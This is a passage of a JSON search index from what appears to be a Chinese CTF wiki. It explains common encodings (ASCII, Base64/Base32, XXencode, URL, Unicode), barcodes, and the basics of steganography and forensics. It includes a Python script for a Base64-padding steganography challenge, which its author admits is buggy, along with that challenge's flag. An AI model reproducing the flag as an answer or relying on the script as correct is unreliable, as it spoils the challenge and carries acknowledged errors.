byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base \u5b57\u8282\u5757\u6709\u4e24\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e00\u4e2a\u7b49\u53f7\u3002\u53c2\u8003\u4e0b\u8868\uff1a\n\n\n\n\n\u7531\u4e8e\u89e3\u7801\u65f6\u8865\u4f4d\u7684 0 \u5e76\u4e0d\u53c2\u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u5728\u8be5\u5904\u9690\u85cf\u4fe1\u606f\u3002\n\n\n\u4e0e base64 \u7c7b\u4f3c\uff0cbase32 \u4f7f\u7528 32 \u4e2a\u53ef\u89c1\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c2 \u7684 5 \u6b21\u65b9\u4e3a 32\uff0c\u6240\u4ee5\u6bcf 5 bit \u4e3a 1 \u4e2a\u5206\u7ec4\u30025 \u5b57\u8282\u4e3a 40 bit\uff0c\u5bf9\u5e94\u4e8e 8 \u4e2a base32 \u5206\u7ec4\uff0c\u5373 5 \u4e2a\u5b57\u8282\u7528 8 \u4e2a base32 \u4e2d\u5b57\u7b26\u6765\u8868\u793a\u3002\u4f46\u5982\u679c\u4e0d\u8db3 5 \u4e2a\u5b57\u8282\uff0c\u5219\u4f1a\u5148\u5bf9\u7b2c\u4e00\u4e2a\u4e0d\u8db3 5 bit \u7684\u5206\u7ec4\u7528 0 \u8865\u8db3\u4e86 5 bit \uff0c\u5bf9\u540e\u9762\u5269\u4f59\u5206\u7ec4\u5168\u90e8\u4f7f\u7528 \u201c=\u201d \u586b\u5145\uff0c\u76f4\u5230\u8865\u6ee1 5 \u4e2a\u5b57\u8282\u3002\u7531\u6b64\u53ef\u77e5\uff0cbase32 \u6700\u591a\u53ea\u6709 6 \u4e2a\u7b49\u53f7\u51fa\u73b0\u3002\u4f8b\u5982\uff1a\n\n\n\n\n\u7279\u70b9\n\n\n\n\nbase64 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 \n=\n \u53f7\uff0c\u4f46\u6700\u591a\u6709 2 \u4e2a\n\n\nbase32 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709 \n=\n \u53f7\uff0c\u4f46\u6700\u591a\u6709 6 \u4e2a\n\n\n\u6839\u636e base \u7684\u4e0d\u540c\uff0c\u5b57\u7b26\u96c6\u4f1a\u6709\u6240\u9650\u5236\n\n\n\u6709\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u52a0\u7b49\u53f7\n\n\n=\u4e5f\u5c31\u662f 3D\n\n\n\u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u89c1 \nbase rfc\n \n\n\n\n\n\u5de5\u5177\n\n\n\n\nhttp://www1.tc711.com/tool/BASE64.htm\n\n\npython \u5e93\u51fd\u6570\n\n\n\n\n\u4f8b\u5b50\n\n\n\u9898\u76ee\u63cf\u8ff0\u53c2\u89c1 \nctf-challenge\n\u4e2d misc \u5206\u7c7b\u7684 base64-stego \u76ee\u5f55\u4e2d\u7684 data.txt \u6587\u4ef6\u3002\n\n\n\u4e00\u5927\u4e32 Base64 \u5bc6\u6587\uff0c\u8bd5\u8bd5\u8865 0 \u4f4d\u7684\u6570\u636e\u3002\n\n\n# coding=utf-8\n\n\nimport\n \nbase64\n\n\nimport\n \nre\n\n\n\nresult\n \n=\n \n[]\n\n\nwith\n \nopen\n(\ntext.txt\n,\n \nr\n)\n \nas\n \nf\n:\n\n    \nfor\n \nline\n \nin\n \nf\n.\nreadlines\n():\n\n        \nif\n \nlen\n(\nre\n.\nfindall\n(\nr\n=\n,\n \nline\n))\n \n==\n \n2\n:\n\n            \nlast\n \n=\n \nline\n[\n-\n4\n]\n\n            \nif\n \nlast\n.\nisupper\n():\n\n                \nnum\n \n=\n \nord\n(\nlast\n)\n \n-\n \nord\n(\nA\n)\n\n            \nelif\n \nlast\n.\nislower\n():\n\n                \nnum\n \n=\n \nord\n(\nlast\n)\n \n-\n \nord\n(\na\n)\n \n+\n \n26\n\n            \nelif\n \nlast\n.\nisdigit\n():\n\n                \nnum\n \n=\n \nint\n(\nlast\n)\n \n+\n \n52\n\n            \nelif\n \nlast\n \n==\n \n+\n:\n\n                \nnum\n \n=\n \n62\n\n            \nelif\n \nlast\n \n==\n \n/\n:\n\n                \nnum\n \n=\n \n63\n\n            \nelem\n \n=\n \n{0:06b}\n.\nformat\n(\nnum\n)\n\n            \nresult\n.\nappend\n(\nelem\n[\n2\n:])\n\n\n        \nelif\n \nlen\n(\nre\n.\nfindall\n(\nr\n=\n,\n \nline\n))\n \n==\n \n1\n:\n\n            \nlast\n \n=\n \nline\n[\n-\n3\n]\n\n            \nif\n \nlast\n.\nisupper\n():\n\n                \nnum\n \n=\n \nord\n(\nlast\n)\n \n-\n \nord\n(\nA\n)\n\n            \nelif\n \nlast\n.\nislower\n():\n\n                \nnum\n \n=\n \nord\n(\nlast\n)\n \n-\n \nord\n(\na\n)\n \n+\n \n26\n\n            \nelif\n \nlast\n.\nisdigit\n():\n\n                \nnum\n \n=\n \nint\n(\nlast\n)\n \n+\n \n52\n\n            \nelif\n \nlast\n \n==\n \n+\n:\n\n                \nnum\n \n=\n \n62\n\n            \nelif\n \nlast\n \n==\n \n/\n:\n\n                \nnum\n \n=\n \n63\n\n            \nelem\n \n=\n \n{0:06b}\n.\nformat\n(\nnum\n)\n\n            \nresult\n.\nappend\n(\nelem\n[\n4\n:])\n\n\n\nflag_b\n \n=\n \n.\njoin\n(\nresult\n)\n\n\nsplit\n \n=\n \nre\n.\nfindall\n(\nr\n.{8}\n,\n \nflag_b\n)\n\n\nfor\n \ni\n \nin\n \nsplit\n:\n\n    \nprint\n \nchr\n(\nint\n(\ni\n,\n \n2\n)),\n\n\n\n\n\n\u611f\u89c9\u50cf\u662f\u7a0b\u5e8f\u6709\u70b9\u6bdb\u75c5\uff0c\u4e0d\u8fc7\u8fd8\u662f\u80fd\u770b\u51fa\u6765 flag\u3002\n\n\nflag{BASE64_i5_amaz1ng~\n\n\n\n\n\u9898\u76ee\n\n\n\u970d\u592b\u66fc\u7f16\u7801\n\n\n\u53c2\u89c1 \n\u970d\u592b\u66fc\u7f16\u7801\n\u3002\n\n\nXXencoding\n\n\nXXencode \u5c06\u8f93\u5165\u6587\u672c\u4ee5\u6bcf\u4e09\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u7f16\u7801\u3002\u5982\u679c\u6700\u540e\u5269\u4e0b\u7684\u8d44\u6599\u5c11\u4e8e\u4e09\u4e2a\u5b57\u8282\uff0c\u4e0d\u591f\u7684\u90e8\u4efd\u7528\u96f6\u8865\u9f50\u3002\u8fd9\u4e09\u4e2a\u5b57\u8282\u5171\u6709 24 \u4e2a Bit\uff0c\u4ee5 6bit \u4e3a\u5355\u4f4d\u5206\u4e3a 4 \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u4ee5\u5341\u8fdb\u5236\u6765\u8868\u793a\u6240\u51fa\u73b0\u7684\u6570\u503c\u53ea\u4f1a\u843d\u5728 0 \u5230 63 \u4e4b\u95f4\u3002\u4ee5\u6240\u5bf9\u5e94\u503c\u7684\u4f4d\u7f6e\u5b57\u7b26\u4ee3\u66ff\u3002\n\n\n           1         2         3         4         5         6\n 0123456789012345678901234567890123456789012345678901234567890123\n |         |         |         |         |         |         |\n +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\n\n\n\n\n\u5177\u4f53\u4fe1\u606f\u53c2\u89c1\n\u7ef4\u57fa\u767e\u79d1\n\n\n\u7279\u70b9\n\n\n\n\n\u53ea\u6709\u6570\u5b57\uff0c\u5927\u5c0f\u5199\u5b57\u6bcd\n\n\n+\u53f7\uff0c-\u53f7\u3002\n\n\n\n\n\u5de5\u5177\n\n\n\n\nhttp://web.chacuo.net/charsetxxencode\n\n\n\n\n\u9898\u76ee\n\n\nURL \u7f16\u7801\n\n\n\u53c2\u89c1\n URL \u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1\n\u3002\n\n\n\u7279\u70b9\n\n\n\n\n\u5927\u91cf\u7684\u767e\u5206\u53f7\n\n\n\n\n\u5de5\u5177\n\n\n\u9898\u76ee\n\n\nUnicode \u7f16\u7801\n\n\n\u53c2\u89c1\n Unicode - \u7ef4\u57fa\u767e\u79d1\n\u3002\n\n\n\u6ce8\u610f\uff0c\u5b83\u6709\u56db\u79cd\u8868\u73b0\u5f62\u5f0f\u3002\n\n\n\u4f8b\u5b50\n\n\n\u6e90\u6587\u672c\uff1a \nThe\n\n\n#x [Hex]:  \n#x0054;\n#x0068;\n#x0065;\n\n\n# [Decimal]:  \n#00084;\n#00104;\n#00101;\n\n\n\\U [Hex]:  \n\\U0054\\U0068\\U0065\n\n\n\\U+ [Hex]:  \n\\U+0054\\U+0068\\U+0065\n\n\n\u5de5\u5177\n\n\n\u9898\u76ee\n\n\nHTML \u5b9e\u4f53\u7f16\u7801", 
            "title": "\u8ba1\u7b97\u673a\u76f8\u5173\u7684\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_1", 
            "text": "A-Z/a-z \u5bf9\u5e94 1-26 \u6216\u8005 0-25", 
            "title": "\u5b57\u6bcd\u8868\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#ascii", 
            "text": "", 
            "title": "ASCII \u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_2", 
            "text": "\u6211\u4eec\u4e00\u822c\u4f7f\u7528\u7684 ascii \u7f16\u7801\u7684\u65f6\u5019\u91c7\u7528\u7684\u90fd\u662f\u53ef\u89c1\u5b57\u7b26\uff0c\u800c\u4e14\u4e3b\u8981\u662f\u5982\u4e0b\u5b57\u7b26   0-9, 49-57  A-Z, 65-90  a-z, 97-122", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/misc/encode/computer/#_3", 
            "text": "", 
            "title": "\u53d8\u5f62"
        }, 
        {
            "location": "/misc/encode/computer/#_4", 
            "text": "\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u4e8c\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002   \u53ea\u6709 0 \u548c 1  \u4e0d\u5927\u4e8e 8 \u4f4d\uff0c\u4e00\u822c 7 \u4f4d\u4e5f\u53ef\u4ee5\uff0c\u56e0\u4e3a\u53ef\u89c1\u5b57\u7b26\u5230 127\u3002  \u5176\u5b9e\u662f\u53e6\u4e00\u79cd ascii \u7f16\u7801\u3002", 
            "title": "\u4e8c\u8fdb\u5236\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_5", 
            "text": "\u5c06 ascii \u7801\u5bf9\u5e94\u7684\u6570\u5b57\u6362\u6210\u5341\u516d\u8fdb\u5236\u8868\u793a\u5f62\u5f0f\u3002   A-Z 41-5 A  a-z 61-7 A", 
            "title": "\u5341\u516d\u8fdb\u5236\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_6", 
            "text": "jpk, ascii to number, number to ascii  http://www.ab126.com/goju/1711.html", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/encode/computer/#_7", 
            "text": "", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/misc/encode/computer/#_8", 
            "text": "Jarvis-basic-\u5fb7\u519b\u7684\u5bc6\u7801", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/encode/computer/#base", 
            "text": "base xx \u4e2d\u7684 xx \u8868\u793a\u7684\u662f\u91c7\u7528\u591a\u5c11\u4e2a\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c\u6bd4\u5982\u8bf4 base64 \u5c31\u662f\u91c7\u7528\u4ee5\u4e0b 64 \u4e2a\u5b57\u7b26\u7f16\u7801\uff0c\u7531\u4e8e 2 \u7684 6 \u6b21\u65b9\u7b49\u4e8e 64\uff0c\u6240\u4ee5\u6bcf 6 \u4e2a\u6bd4\u7279\u4e3a\u4e00\u4e2a\u5355\u5143\uff0c\u5bf9\u5e94\u67d0\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u30023\u4e2a\u5b57\u8282\u5c31\u6709 24 \u4e2a\u6bd4\u7279\uff0c\u5bf9\u5e94\u4e8e 4 \u4e2a Base64 \u5355\u5143\uff0c\u5373 3 \u4e2a\u5b57\u8282\u9700\u8981\u7528 4 \u4e2a\u53ef\u6253\u5370\u5b57\u7b26\u6765\u8868\u793a\u3002\u5b83\u53ef\u7528\u6765\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u7684\u4f20\u8f93\u7f16\u7801\u3002\u5728 Base64 \u4e2d\u7684\u53ef\u6253\u5370\u5b57\u7b26\u5305\u62ec\u5b57\u6bcd A-Z\u3001a-z\u3001\u6570\u5b57 0-9\uff0c\u8fd9\u6837\u5171\u6709 62 \u4e2a\u5b57\u7b26\uff0c\u6b64\u5916\u4e24\u4e2a\u53ef\u6253\u5370\u7b26\u53f7\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u4e2d\u800c\u4e0d\u540c\u3002   \u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1  Base64 - \u7ef4\u57fa\u767e\u79d1 \u3002  \u7f16\u7801 man   \u5982\u679c\u8981\u7f16\u7801\u7684\u5b57\u8282\u6570\u4e0d\u80fd\u88ab 3 \u6574\u9664\uff0c\u6700\u540e\u4f1a\u591a\u51fa 1 \u4e2a\u6216 2 \u4e2a\u5b57\u8282\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u8fdb\u884c\u5904\u7406\uff1a\u5148\u4f7f\u7528 0 \u503c\u5728\u672b\u5c3e\u8865\u8db3\uff0c\u4f7f\u5176\u80fd\u591f\u88ab 3 \u6574\u9664\uff0c\u7136\u540e\u518d\u8fdb\u884c base64 \u7684\u7f16\u7801\u3002\u5728\u7f16\u7801\u540e\u7684 base64 \u6587\u672c\u540e\u52a0\u4e0a\u4e00\u4e2a\u6216\u4e24\u4e2a  =  \u53f7\uff0c\u4ee3\u8868\u8865\u8db3\u7684\u5b57\u8282\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6700\u540e\u5269\u4f59\u4e00\u4e2a\u516b\u4f4d\u5b57\u8282\uff08\u4e00\u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base64 \u5b57\u8282\u5757\u6709\u56db\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e0a\u4e24\u4e2a\u7b49\u53f7\uff1b\u5982\u679c\u6700\u540e\u5269\u4f59\u4e24\u4e2a\u516b\u4f4d\u5b57\u8282\uff082 \u4e2a byte\uff09\u65f6\uff0c\u6700\u540e\u4e00\u4e2a 6 \u4f4d\u7684 base \u5b57\u8282\u5757\u6709\u4e24\u4f4d\u662f 0 \u503c\uff0c\u6700\u540e\u9644\u52a0\u4e00\u4e2a\u7b49\u53f7\u3002\u53c2\u8003\u4e0b\u8868\uff1a   \u7531\u4e8e\u89e3\u7801\u65f6\u8865\u4f4d\u7684 0 \u5e76\u4e0d\u53c2\u4e0e\u8fd0\u7b97\uff0c\u53ef\u4ee5\u5728\u8be5\u5904\u9690\u85cf\u4fe1\u606f\u3002  \u4e0e base64 \u7c7b\u4f3c\uff0cbase32 \u4f7f\u7528 32 \u4e2a\u53ef\u89c1\u5b57\u7b26\u8fdb\u884c\u7f16\u7801\uff0c2 \u7684 5 \u6b21\u65b9\u4e3a 32\uff0c\u6240\u4ee5\u6bcf 5 bit \u4e3a 1 \u4e2a\u5206\u7ec4\u30025 \u5b57\u8282\u4e3a 40 bit\uff0c\u5bf9\u5e94\u4e8e 8 \u4e2a base32 \u5206\u7ec4\uff0c\u5373 5 \u4e2a\u5b57\u8282\u7528 8 \u4e2a base32 \u4e2d\u5b57\u7b26\u6765\u8868\u793a\u3002\u4f46\u5982\u679c\u4e0d\u8db3 5 \u4e2a\u5b57\u8282\uff0c\u5219\u4f1a\u5148\u5bf9\u7b2c\u4e00\u4e2a\u4e0d\u8db3 5 bit \u7684\u5206\u7ec4\u7528 0 \u8865\u8db3\u4e86 5 bit \uff0c\u5bf9\u540e\u9762\u5269\u4f59\u5206\u7ec4\u5168\u90e8\u4f7f\u7528 \u201c=\u201d \u586b\u5145\uff0c\u76f4\u5230\u8865\u6ee1 5 \u4e2a\u5b57\u8282\u3002\u7531\u6b64\u53ef\u77e5\uff0cbase32 \u6700\u591a\u53ea\u6709 6 \u4e2a\u7b49\u53f7\u51fa\u73b0\u3002\u4f8b\u5982\uff1a", 
            "title": "Base \u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_9", 
            "text": "base64 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709  =  \u53f7\uff0c\u4f46\u6700\u591a\u6709 2 \u4e2a  base32 \u7ed3\u5c3e\u53ef\u80fd\u4f1a\u6709  =  \u53f7\uff0c\u4f46\u6700\u591a\u6709 6 \u4e2a  \u6839\u636e base \u7684\u4e0d\u540c\uff0c\u5b57\u7b26\u96c6\u4f1a\u6709\u6240\u9650\u5236  \u6709\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u52a0\u7b49\u53f7  =\u4e5f\u5c31\u662f 3D  \u66f4\u591a\u5185\u5bb9\u8bf7\u53c2\u89c1  base rfc", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/misc/encode/computer/#_10", 
            "text": "http://www1.tc711.com/tool/BASE64.htm  python \u5e93\u51fd\u6570", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/encode/computer/#_11", 
            "text": "\u9898\u76ee\u63cf\u8ff0\u53c2\u89c1  ctf-challenge \u4e2d misc \u5206\u7c7b\u7684 base64-stego \u76ee\u5f55\u4e2d\u7684 data.txt \u6587\u4ef6\u3002  \u4e00\u5927\u4e32 Base64 \u5bc6\u6587\uff0c\u8bd5\u8bd5\u8865 0 \u4f4d\u7684\u6570\u636e\u3002  # coding=utf-8  import   base64  import   re  result   =   []  with   open ( text.txt ,   r )   as   f : \n     for   line   in   f . readlines (): \n         if   len ( re . findall ( r = ,   line ))   ==   2 : \n             last   =   line [ - 4 ] \n             if   last . isupper (): \n                 num   =   ord ( last )   -   ord ( A ) \n             elif   last . islower (): \n                 num   =   ord ( last )   -   ord ( a )   +   26 \n             elif   last . isdigit (): \n                 num   =   int ( last )   +   52 \n             elif   last   ==   + : \n                 num   =   62 \n             elif   last   ==   / : \n                 num   =   63 \n             elem   =   {0:06b} . format ( num ) \n             result . append ( elem [ 2 :]) \n\n         elif   len ( re . findall ( r = ,   line ))   ==   1 : \n             last   =   line [ - 3 ] \n             if   last . isupper (): \n                 num   =   ord ( last )   -   ord ( A ) \n             elif   last . islower (): \n                 num   =   ord ( last )   -   ord ( a )   +   26 \n             elif   last . isdigit (): \n                 num   =   int ( last )   +   52 \n             elif   last   ==   + : \n                 num   =   62 \n             elif   last   ==   / : \n                 num   =   63 \n             elem   =   {0:06b} . format ( num ) \n             result . append ( elem [ 4 :])  flag_b   =   . join ( result )  split   =   re . findall ( r .{8} ,   flag_b )  for   i   in   split : \n     print   chr ( int ( i ,   2 )),   \u611f\u89c9\u50cf\u662f\u7a0b\u5e8f\u6709\u70b9\u6bdb\u75c5\uff0c\u4e0d\u8fc7\u8fd8\u662f\u80fd\u770b\u51fa\u6765 flag\u3002  flag{BASE64_i5_amaz1ng~", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/misc/encode/computer/#_12", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/encode/computer/#_13", 
            "text": "\u53c2\u89c1  \u970d\u592b\u66fc\u7f16\u7801 \u3002", 
            "title": "\u970d\u592b\u66fc\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#xxencoding", 
            "text": "XXencode \u5c06\u8f93\u5165\u6587\u672c\u4ee5\u6bcf\u4e09\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u7f16\u7801\u3002\u5982\u679c\u6700\u540e\u5269\u4e0b\u7684\u8d44\u6599\u5c11\u4e8e\u4e09\u4e2a\u5b57\u8282\uff0c\u4e0d\u591f\u7684\u90e8\u4efd\u7528\u96f6\u8865\u9f50\u3002\u8fd9\u4e09\u4e2a\u5b57\u8282\u5171\u6709 24 \u4e2a Bit\uff0c\u4ee5 6bit \u4e3a\u5355\u4f4d\u5206\u4e3a 4 \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u4ee5\u5341\u8fdb\u5236\u6765\u8868\u793a\u6240\u51fa\u73b0\u7684\u6570\u503c\u53ea\u4f1a\u843d\u5728 0 \u5230 63 \u4e4b\u95f4\u3002\u4ee5\u6240\u5bf9\u5e94\u503c\u7684\u4f4d\u7f6e\u5b57\u7b26\u4ee3\u66ff\u3002             1         2         3         4         5         6\n 0123456789012345678901234567890123456789012345678901234567890123\n |         |         |         |         |         |         |\n +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz  \u5177\u4f53\u4fe1\u606f\u53c2\u89c1 \u7ef4\u57fa\u767e\u79d1", 
            "title": "XXencoding"
        }, 
        {
            "location": "/misc/encode/computer/#_14", 
            "text": "\u53ea\u6709\u6570\u5b57\uff0c\u5927\u5c0f\u5199\u5b57\u6bcd  +\u53f7\uff0c-\u53f7\u3002", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/misc/encode/computer/#_15", 
            "text": "http://web.chacuo.net/charsetxxencode", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/encode/computer/#_16", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/encode/computer/#url", 
            "text": "\u53c2\u89c1  URL \u7f16\u7801 - \u7ef4\u57fa\u767e\u79d1 \u3002", 
            "title": "URL \u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_17", 
            "text": "\u5927\u91cf\u7684\u767e\u5206\u53f7", 
            "title": "\u7279\u70b9"
        }, 
        {
            "location": "/misc/encode/computer/#_18", 
            "text": "", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/encode/computer/#_19", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/encode/computer/#unicode", 
            "text": "\u53c2\u89c1  Unicode - \u7ef4\u57fa\u767e\u79d1 \u3002  \u6ce8\u610f\uff0c\u5b83\u6709\u56db\u79cd\u8868\u73b0\u5f62\u5f0f\u3002", 
            "title": "Unicode \u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/computer/#_20", 
            "text": "\u6e90\u6587\u672c\uff1a  The  #x [Hex]:   #x0054; #x0068; #x0065;  # [Decimal]:   #00084; #00104; #00101;  \\U [Hex]:   \\U0054\\U0068\\U0065  \\U+ [Hex]:   \\U+0054\\U+0068\\U+0065", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/misc/encode/computer/#_21", 
            "text": "", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/misc/encode/computer/#_22", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/misc/encode/computer/#html", 
            "text": "", 
            "title": "HTML \u5b9e\u4f53\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/modern/", 
            "text": "\u6761\u5f62\u7801\n\n\n\n\n\u5bbd\u5ea6\u4e0d\u7b49\u7684\u591a\u4e2a\u9ed1\u6761\u548c\u7a7a\u767d\uff0c\u6309\u7167\u4e00\u5b9a\u7684\u7f16\u7801\u89c4\u5219\u6392\u5217\uff0c\u7528\u4ee5\u8868\u8fbe\u4e00\u7ec4\u4fe1\u606f\u7684\u56fe\u5f62\u6807\u8bc6\u7b26\n\n\n\u56fd\u9645\u6807\u51c6\n\n\nEAN-13 \u5546\u54c1\u6807\u51c6\uff0c13 \u4f4d\u6570\u5b57\n\n\nCode-39\uff1a39 \u5b57\u7b26\n\n\nCode-128\uff1a128 \u5b57\u7b26\n\n\n\u6761\u5f62\u7801\u5728\u7ebf\u8bc6\u522b\n\n\n\n\n\u4e8c\u7ef4\u7801\n\n\n\n\n\u7528\u67d0\u79cd\u7279\u5b9a\u51e0\u4f55\u56fe\u5f62\u6309\u4e00\u5b9a\u89c4\u5f8b\u5728\u5e73\u9762\u5206\u6b65\u7684\u9ed1\u767d\u76f8\u95f4\u7684\u56fe\u5f62\u8bb0\u5f55\u6570\u636e\u7b26\u53f7\u4fe1\u606f\n\n\n\u5806\u53e0\u5f0f / \u884c\u6392\u5f0f\u4e8c\u7ef4\u7801\uff1aCode 16 k\u3001Code 49\u3001PDF417\n\n\n\n\n\u77e9\u9635\u5f0f\u4e8c\u7ef4\u7801\uff1aQR CODE", 
            "title": "\u73b0\u5b9e\u4e16\u754c\u4e2d\u5e38\u7528\u7684\u7f16\u7801"
        }, 
        {
            "location": "/misc/encode/modern/#_1", 
            "text": "\u5bbd\u5ea6\u4e0d\u7b49\u7684\u591a\u4e2a\u9ed1\u6761\u548c\u7a7a\u767d\uff0c\u6309\u7167\u4e00\u5b9a\u7684\u7f16\u7801\u89c4\u5219\u6392\u5217\uff0c\u7528\u4ee5\u8868\u8fbe\u4e00\u7ec4\u4fe1\u606f\u7684\u56fe\u5f62\u6807\u8bc6\u7b26  \u56fd\u9645\u6807\u51c6  EAN-13 \u5546\u54c1\u6807\u51c6\uff0c13 \u4f4d\u6570\u5b57  Code-39\uff1a39 \u5b57\u7b26  Code-128\uff1a128 \u5b57\u7b26  \u6761\u5f62\u7801\u5728\u7ebf\u8bc6\u522b", 
            "title": "\u6761\u5f62\u7801"
        }, 
        {
            "location": "/misc/encode/modern/#_2", 
            "text": "\u7528\u67d0\u79cd\u7279\u5b9a\u51e0\u4f55\u56fe\u5f62\u6309\u4e00\u5b9a\u89c4\u5f8b\u5728\u5e73\u9762\u5206\u6b65\u7684\u9ed1\u767d\u76f8\u95f4\u7684\u56fe\u5f62\u8bb0\u5f55\u6570\u636e\u7b26\u53f7\u4fe1\u606f  \u5806\u53e0\u5f0f / \u884c\u6392\u5f0f\u4e8c\u7ef4\u7801\uff1aCode 16 k\u3001Code 49\u3001PDF417   \u77e9\u9635\u5f0f\u4e8c\u7ef4\u7801\uff1aQR CODE", 
            "title": "\u4e8c\u7ef4\u7801"
        }, 
        {
            "location": "/misc/prefix/", 
            "text": "\u5927\u90e8\u5206\u7684 CTF \u6bd4\u8d5b\u4e2d\uff0c\u53d6\u8bc1\u53ca\u9690\u5199\u4e24\u8005\u5bc6\u4e0d\u53ef\u5206\uff0c\u4e24\u8005\u6240\u9700\u8981\u7684\u77e5\u8bc6\u4e5f\u76f8\u8f85\u76f8\u6210\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e5f\u5c06\u5bf9\u4e24\u8005\u4e00\u8d77\u4ecb\u7ecd\u3002\n\n\n\u4efb\u4f55\u8981\u6c42\u68c0\u67e5\u4e00\u4e2a\u9759\u6001\u6570\u636e\u6587\u4ef6\u4ece\u800c\u83b7\u53d6\u9690\u85cf\u4fe1\u606f\u7684\u90fd\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u9690\u5199\u53d6\u8bc1\u9898\uff08\u9664\u975e\u5355\u7eaf\u5730\u662f\u5bc6\u7801\u5b66\u7684\u77e5\u8bc6\uff09\uff0c\u4e00\u4e9b\u4f4e\u5206\u7684\u9690\u5199\u53d6\u8bc1\u53c8\u5e38\u5e38\u4e0e\u53e4\u5178\u5bc6\u7801\u5b66\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u800c\u9ad8\u5206\u7684\u9898\u76ee\u5219\u901a\u5e38\u7528\u4e0e\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u73b0\u4ee3\u5bc6\u7801\u5b66\u77e5\u8bc6\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5f88\u597d\u5730\u4f53\u73b0\u4e86 Misc \u9898\u7684\u7279\u70b9\u3002\n\n\n\u524d\u7f6e\u6280\u80fd\n\n\n\n\n\n\n\u4e86\u89e3\u5e38\u89c1\u7684\u7f16\u7801\n\n\n\u80fd\u591f\u5bf9\u6587\u4ef6\u4e2d\u51fa\u73b0\u7684\u4e00\u4e9b\u7f16\u7801\u8fdb\u884c\u89e3\u7801\uff0c\u5e76\u4e14\u5bf9\u4e00\u4e9b\u7279\u6b8a\u7684\u7f16\u7801\uff08Base64\u3001\u5341\u516d\u8fdb\u5236\u3001\u4e8c\u8fdb\u5236\u7b49\uff09\u6709\u4e00\u5b9a\u7684\u654f\u611f\u5ea6\uff0c\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\u5e76\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002\n\n\n\n\n\n\n\u80fd\u591f\u5229\u7528\u811a\u672c\u8bed\u8a00\uff08Python \u7b49\uff09\u53bb\u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e\n\n\n\n\n\u719f\u77e5\u5e38\u89c1\u6587\u4ef6\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5c24\u5176\u662f\u5404\u7c7b \n\u6587\u4ef6\u5934\n\u3001\u534f\u8bae\u3001\u7ed3\u6784\u7b49\n\n\n\u7075\u6d3b\u8fd0\u7528\u5e38\u89c1\u7684\u5de5\u5177\n\n\n\n\nPython \u64cd\u4f5c\u4e8c\u8fdb\u5236\u6570\u636e\n\n\nstruct \u6a21\u5757\n\n\n\u6709\u7684\u65f6\u5019\u9700\u8981\u7528 Python 